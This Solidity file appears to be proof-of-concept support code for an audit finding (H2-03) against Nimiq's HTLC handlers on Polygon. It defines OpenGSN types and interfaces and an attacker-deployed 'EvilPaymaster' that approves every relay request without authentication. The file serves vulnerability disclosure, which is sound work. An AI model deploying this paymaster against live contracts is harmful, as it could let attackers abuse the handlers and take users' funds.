// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

// ============================================================================
// H2-03 Nimiq HTLC handlers (Polygon) — PoC support code
// Minimal OpenGSN v2.2 types + interfaces + the attacker's EvilPaymaster.
// ============================================================================

struct ForwardRequest {
    address from;
    address to;
    uint256 value;
    uint256 gas;
    uint256 nonce;
    bytes data;
    uint256 validUntil;
}

struct RelayData {
    uint256 gasPrice;
    uint256 pctRelayFee;
    uint256 baseRelayFee;
    address relayWorker;
    address paymaster;
    address forwarder;
    bytes paymasterData;
    uint256 clientId;
}

struct RelayRequest {
    ForwardRequest request;
    RelayData relayData;
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function allowance(address, address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function transferFrom(address, address, uint256) external returns (bool);
}

interface IRelayHub {
    function relayCall(
        uint256 maxAcceptanceBudget,
        RelayRequest calldata relayRequest,
        bytes calldata signature,
        bytes calldata approvalData,
        uint256 externalGasLimit
    ) external returns (bool paymasterAccepted, bytes memory returnValue);

    function addRelayWorkers(address[] calldata newRelayWorkers) external;
    function workerToManager(address) external view returns (address);
    function isRelayManagerStaked(address) external view returns (bool);
    function balanceOf(address) external view returns (uint256);
}

interface IStakeManager {
    function setRelayManagerOwner(address payable owner) external;
    function stakeForRelayManager(address relayManager, uint256 unstakeDelay) external payable;
    function authorizeHubByManager(address relayHub) external;
}

interface IPaymaster {
    struct GasAndDataLimits {
        uint256 acceptanceBudget;
        uint256 preRelayedCallGasLimit;
        uint256 postRelayedCallGasLimit;
        uint256 calldataSizeLimit;
    }

    function getGasAndDataLimits() external view returns (GasAndDataLimits memory);
    function trustedForwarder() external view returns (address);
    function getHubAddr() external view returns (address);
    function getRelayHubDeposit() external view returns (uint256);

    function preRelayedCall(
        RelayRequest calldata relayRequest,
        bytes calldata signature,
        bytes calldata approvalData,
        uint256 maxPossibleGas
    ) external returns (bytes memory context, bool rejectOnRecipientRevert);

    function postRelayedCall(
        bytes calldata context,
        bool success,
        uint256 gasUseWithoutPost,
        RelayData calldata relayData
    ) external;

    function versionPaymaster() external view returns (string memory);
}

/// @notice The Nimiq combined-GSN handler surface used by the exploit.
interface INimiqHandler {
    function getHubAddr() external view returns (address);
    function getNonce(address from) external view returns (uint256);
    function owner() external view returns (address);
    function setRelayHub(address hub) external;

    function open(
        bytes32 id,
        address token,
        uint256 amount,
        address refundAddress,
        address recipientAddress,
        bytes32 hash,
        uint256 timeout,
        uint256 fee
    ) external;

    function redeem(bytes32 id, address target, bytes32 secret, uint256 fee) external;

    function execute(
        ForwardRequest calldata request,
        bytes32 domainSeparator,
        bytes32 requestTypeHash,
        bytes calldata suffixData,
        bytes calldata signature
    ) external payable returns (bool success, bytes memory ret);

    function verify(
        ForwardRequest calldata forwardRequest,
        bytes32 domainSeparator,
        bytes32 requestTypeHash,
        bytes calldata suffixData,
        bytes calldata signature
    ) external view;

    function relayWithoutGsn(
        RelayRequest calldata relayRequest,
        bytes calldata signature,
        bytes calldata approvalData,
        address payable relay
    ) external;
}

/// @notice Attacker-deployed paymaster that accepts every request unconditionally.
///         This is the role the hub trusts to have run authentication — it skips it.
contract EvilPaymaster is IPaymaster {
    function getGasAndDataLimits() external pure returns (GasAndDataLimits memory) {
        return GasAndDataLimits(400000, 400000, 100000, 2048);
    }

    function trustedForwarder() external pure returns (address) {
        return address(0);
    }

    function getHubAddr() external pure returns (address) {
        return address(0);
    }

    function getRelayHubDeposit() external pure returns (uint256) {
        return 0;
    }

    function preRelayedCall(
        RelayRequest calldata,
        bytes calldata,
        bytes calldata,
        uint256
    ) external pure returns (bytes memory context, bool rejectOnRecipientRevert) {
        return ("", false);
    }

    function postRelayedCall(bytes calldata, bool, uint256, RelayData calldata) external pure {}

    function versionPaymaster() external pure returns (string memory) {
        return "evil-2.2";
    }
}
